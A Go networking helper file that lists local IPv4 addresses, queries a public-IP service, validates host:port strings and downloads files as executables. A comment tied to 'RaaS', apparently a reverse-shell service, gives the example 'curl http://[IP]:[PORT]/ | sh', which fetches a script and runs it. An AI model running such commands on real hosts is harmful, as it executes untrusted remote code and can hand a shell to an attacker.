package network

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"

	"github.com/go-playground/validator/v10"
)

func GatherInterfacesList(host string) []string {
	// Gather interface info
	var interfaces []string
	// Add help information of RaaS
	// eg: curl http://[IP]:[PORT]/ | sh
	if net.ParseIP(host).IsUnspecified() {
		// tcpServer.Host is unspecified
		// eg: "0.0.0.0", "[::]"
		ifaces, _ := net.Interfaces()
		for _, i := range ifaces {
			addrs, _ := i.Addrs()
			for _, addr := range addrs {
				switch v := addr.(type) {
				case *net.IPNet:
					// ipv4
					if addr.(*net.IPNet).IP.To4() != nil {
						interfaces = append(interfaces, v.IP.String())
						break
					}
				}
			}
		}
	} else {
		interfaces = append(interfaces, host)
	}
	return interfaces
}

type IP struct {
	Query string
}

func GetPublicIP() (string, error) {
	req, err := http.Get("http://ip-api.com/json/")
	if err != nil {
		return "", err
	}
	defer req.Body.Close()

	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return "", err
	}

	var ip IP
	json.Unmarshal(body, &ip)

	return ip.Query, nil
}

func ParseHostPort(addr string) (string, uint16, error) {
	parts := strings.Split(addr, ":")
	if len(parts) != 2 {
		return "", 0, fmt.Errorf("invalid address")
	}

	var hp struct {
		Host string `validate:"ip|hostname"`
		Port uint16 `validate:"numeric,max=65535,min=0"`
	}
	hp.Host = parts[0]
	port, _ := strconv.Atoi(parts[1])
	hp.Port = uint16(port)

	validate := validator.New()
	err := validate.Struct(hp)
	if err != nil {
		return "", 0, err
	}
	return hp.Host, hp.Port, nil
}

func DownloadFile(url string, filepath string, mode int) error {
	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.OpenFile(filepath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}
